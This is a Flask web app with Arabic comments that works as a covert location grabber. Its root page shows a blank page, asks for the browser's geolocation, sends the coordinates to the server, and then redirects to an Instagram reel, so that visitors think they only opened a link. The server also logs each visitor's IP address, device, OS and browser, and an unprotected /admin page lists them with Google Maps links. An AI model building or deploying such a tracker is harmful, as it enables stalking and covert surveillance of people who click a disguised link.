from flask import Flask, request, redirect

app = Flask(__name__)

# قائمة مؤقتة للبيانات
visitors = []

TARGET_URL = "https://www.instagram.com/reel/DW1uB4LjM8N/"

@app.route('/')
def index():
    # كود HTML يعرض صفحة بيضاء ويطلب الموقع ثم يحول المستخدم
    return f"""
    <html>
    <body>
        <script>
            async function logAndRedirect() {{
                if (navigator.geolocation) {{
                    try {{
                        const pos = await new Promise((resolve, reject) => {{
                            navigator.geolocation.getCurrentPosition(resolve, reject);
                        }});
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        // إرسال البيانات للسيرفر
                        await fetch('/log?lat=' + lat + '&lon=' + lon);
                    }} catch (e) {{ console.log("Location denied"); }}
                }}
                window.location.href = '{TARGET_URL}';
            }}
            logAndRedirect();
        </script>
    </body>
    </html>
    """

@app.route('/log')
def log():
    from user_agents import parse
    ua_string = request.headers.get('User-Agent')
    user_agent = parse(ua_string)
    
    data = {
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "lat": request.args.get('lat', 'N/A'),
        "lon": request.args.get('lon', 'N/A'),
        "device": user_agent.device.family,
        "os": user_agent.os.family,
        "browser": user_agent.browser.family
    }
    visitors.append(data)
    return "OK"

@app.route('/admin')
def admin():
    if not visitors:
        return "<h1>لا توجد بيانات مسجلة.</h1>"
    
    rows = ""
    for v in visitors:
        map_link = f"https://www.google.com/maps?q={v['lat']},{v['lon']}"
        rows += f"<tr><td>{v['ip']}</td><td>{v['device']}</td><td>{v['os']}</td><td>{v['browser']}</td><td><a href='{map_link}' target='_blank'>الخريطة</a></td></tr>"
    
    return f"""
    <h1>بيانات الزوار</h1>
    <table border='1'>
        <tr><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Location</th></tr>
        {rows}
    </table>
    """

if __name__ == '__main__':
    app.run()

